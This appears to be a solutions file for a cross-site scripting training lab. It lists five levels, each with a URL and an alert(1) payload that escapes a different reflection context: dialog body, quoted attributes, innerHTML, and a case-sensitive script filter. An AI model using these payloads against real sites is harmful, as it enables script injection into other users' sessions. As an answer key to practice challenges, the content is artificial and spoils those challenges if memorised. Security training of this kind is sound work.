# dialog — solutions

Reflections inside `<dialog>` element bodies, attributes, and JS sinks.

### dialog-level1

`/dialog/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in `<dialog open>` body

### dialog-level2

`/dialog/level2/?query=x%27%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `x'><script>alert(1)</script>`
- context: inside `<dialog id='...'>` — break single-quoted attribute

### dialog-level3

`/dialog/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: inside `<input value="...">` and `<button value="...">` — break attribute

### dialog-level4

`/dialog/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: to_json'd into JS string then assigned to innerHTML — HTML parser runs

### dialog-level5

`/dialog/level5/?query=%3CScript%3Ealert(1)%3C/Script%3E`

- payload: `<Script>alert(1)</Script>`
- context: case-sensitive strip of `<script>`/`</script>`; mixed case survives
